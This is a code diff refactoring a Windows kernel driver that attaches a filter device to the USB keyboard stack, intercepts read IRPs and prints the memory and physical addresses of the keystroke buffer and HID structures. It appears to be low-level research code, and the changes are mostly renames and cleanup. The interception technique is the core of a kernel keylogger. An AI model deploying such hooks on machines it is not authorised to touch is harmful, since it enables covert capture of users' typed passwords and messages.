@@ -7,8 +7,12 @@
 #include <PageTableManipulation.h>
 #include <KeyboardHooker.h>
 
-PULONG keyboardFlag = NULL;
+int numPendingHookIrps = 0;
+PVOID queryPvoid = NULL;
+PDEVICE_OBJECT pKeyboardDeviceObject;
 PDEVICE_OBJECT usbKeyboardDeviceObject;
+PULONG keyboardFlag = NULL;
+
 VOID pauseForABit(CSHORT secondsDelay) {
 
 	LARGE_INTEGER systemTime;
@@ -46,15 +50,9 @@ VOID pauseForABit(CSHORT secondsDelay) {
 	return;
 }
 
-//#define RAMSTR "System RAM"
-
-int numPendingIrps = 0;
-PVOID queryPvoid = NULL;
-
 _Use_decl_annotations_
 NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
 {
-	//KdPrint(("OnReadCompletion IRQ Level [%u]\n", KeGetCurrentIrql()));
 
 	UNREFERENCED_PARAMETER(Context);
 	PKEYBOARD_INPUT_DATA keys;
@@ -73,7 +71,6 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 			if (keyboardFlag == NULL) {
 				keyboardFlag = keys;
 			}
-
 
 			if (queryPvoid) {
 				if (MmIsAddressValid(queryPvoid)) {
@@ -115,24 +112,21 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 						, *make, make, makePA, *pflag, pflag, flagPA));
 			}
 		}
-	}//end if  
-	/**/
+	} 
 
 	//Mark the Irp pending if necessary   
 	if (pIrp->PendingReturned) {
 		IoMarkIrpPending(pIrp);
 	}
 	//Remove the Irp from our own count of tagged (pending) IRPs   
-	numPendingIrps--;
+	numPendingHookIrps--;
 
 	return pIrp->IoStatus.Status;
 }//end OnReadCompletion   
-/**/
 
 _Use_decl_annotations_
 NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
 {
-	//KdPrint(("DispathcRead IRQ Level [%u]\n", KeGetCurrentIrql())); 
 	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
 	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
 	*nextIrpStack = *currentIrpStack;
@@ -141,60 +135,42 @@ NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
 	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);
 
 	//track the # of pending IRPs   
-	numPendingIrps++;
+	numPendingHookIrps++;
 
 	//Pass the IRP on down to the driver underneath us   
 	return IoCallDriver(((PKLOG_DEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
 
 }//end DispatchRead   
-/**/
 
-PDEVICE_OBJECT pKeyboardDeviceObject;
 _Use_decl_annotations_
 NTSTATUS PrepHook(IN PDRIVER_OBJECT pDriverObject) {
-
+	KdPrint(("HookKeyboard IRQ Level [%u]\n", KeGetCurrentIrql()));
 
 	NTSTATUS status;
-	KdPrint(("HookKeyboard IRQ Level [%u]\n", KeGetCurrentIrql()));
-	//the filter device object   
-
-	//PDEVICE_OBJECT usbKeyboardDeviceObject;
-
 	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension;
 
-	//Create a keyboard device object   // KLOG_DEVICE_EXTENSION
+	//Create a keyboard device object 
 	status = IoCreateDevice(pDriverObject, sizeof(KLOG_DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);
 
 	KdPrint(("Created keyboard device successfully...\n"));
 	KdPrint(("pKeyboardDeviceObject is: [0x%llx]\n", pKeyboardDeviceObject));
 
-//	pauseForABit(10);
-
-	// Set the Flags
-	//pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DRVO_LEGACY_RESOURCES);
-	//KdPrint(("DO_BUFFERED_IO | DRVO_LEGACY_RESOURCES Flags set\n"));
 	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
 	KdPrint(("DO_BUFFERED_IO | DO_POWER_PAGABLE Flags set\n"));
-//	pauseForABit(10);
 	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
-//	KdPrint(("Flags set succesfully...\n"));
-//	pauseForABit(10);
 
 	// Zero out the device extension  
 	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(KLOG_DEVICE_EXTENSION));
-//	KdPrint(("Device Extension Initialized...\n"));
-//	pauseForABit(10);
 	return status;
 }
+
 _Use_decl_annotations_
-NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject, IN PDEVICE_OBJECT usbBaseKeyboardDeviceObject)
+NTSTATUS HookKeyboard(IN PDEVICE_OBJECT usbBaseKeyboardDeviceObject)
 {
 	NTSTATUS status;
 	usbKeyboardDeviceObject = usbBaseKeyboardDeviceObject->AttachedDevice;
 
 	if (usbKeyboardDeviceObject) {
-//		KdPrint(("got usbkeyboarddeviceobject\n"));
-//		pauseForABit(10);
 		PHID_KBD usbDeviceExtension = usbKeyboardDeviceObject->DeviceExtension;
 
 		PDEVOBJ_EXTENSION usbObjectExtension = usbKeyboardDeviceObject->DeviceObjectExtension;
@@ -207,22 +183,17 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject, IN PDEVICE_OBJECT usbBase
 		KdPrint(("size of PSECURITY_DESCRIPTOR is: [%d]\n", sizeof(PSECURITY_DESCRIPTOR)));
 		KdPrint(("size of KEVENT               is: [%d]\n", sizeof(KEVENT)));
 
-		//KdPrint(("\npKeyboardDeviceObject is: [0x%lx] [0x%lx]\n", pKeyboardDeviceObject, MmGetPhysicalAddress(pKeyboardDeviceObject)));
 		KdPrint(("usbKeyboardDeviceObject is: [0x%lx] [0x%lx]\n", usbKeyboardDeviceObject, MmGetPhysicalAddress(usbKeyboardDeviceObject)));
 		KdPrint(("usbObjectExtension is: [0x%lx] [0x%lx]\n", usbObjectExtension, MmGetPhysicalAddress(usbObjectExtension)));
 		KdPrint(("usbDeviceExtension is: [0x%lx] [0x%lx]\n", usbDeviceExtension, MmGetPhysicalAddress(usbDeviceExtension)));
 		KdPrint(("usbDeviceExtension pHidFuncs is: [0x%lx] [0x%lx]\n", usbDeviceExtension->pHidFuncs, MmGetPhysicalAddress(usbDeviceExtension->pHidFuncs)));
 		KdPrint(("phidpPreparsedData phidpPreparsedData is: [0x%lx] [0x%lx]\n", usbDeviceExtension->phidpPreparsedData, MmGetPhysicalAddress(usbDeviceExtension->phidpPreparsedData)));
 		KdPrint(("usbDeviceExtension pbOutputBuffer is: [0x%lx] [0x%lx]\n\n", usbDeviceExtension->pbOutputBuffer, MmGetPhysicalAddress(usbDeviceExtension->pbOutputBuffer)));
-
-		//DeviceObjectExtension
 	}
 	else {
 		KdPrint(("usbKeyboardDeviceObject is NULL\n"));
-//		pauseForABit(10);
 	}
 	KdPrint(("about to attach to device stack safe\n"));
-//	pauseForABit(10);
 
 	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
 	status = IoAttachDeviceToDeviceStackSafe(pKeyboardDeviceObject, usbKeyboardDeviceObject, &pKeyboardDeviceExtension->pKeyboardDevice);
@@ -253,9 +224,7 @@ _Use_decl_annotations_
 NTSTATUS SetMajorFunction(_In_ PDRIVER_OBJECT  DriverObject)
 {
 	KdPrint(("SetMajorFunction IRQ Level [%u]", KeGetCurrentIrql()));
-//	pauseForABit(10);
 	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
-
 	return STATUS_SUCCESS;
 }
 
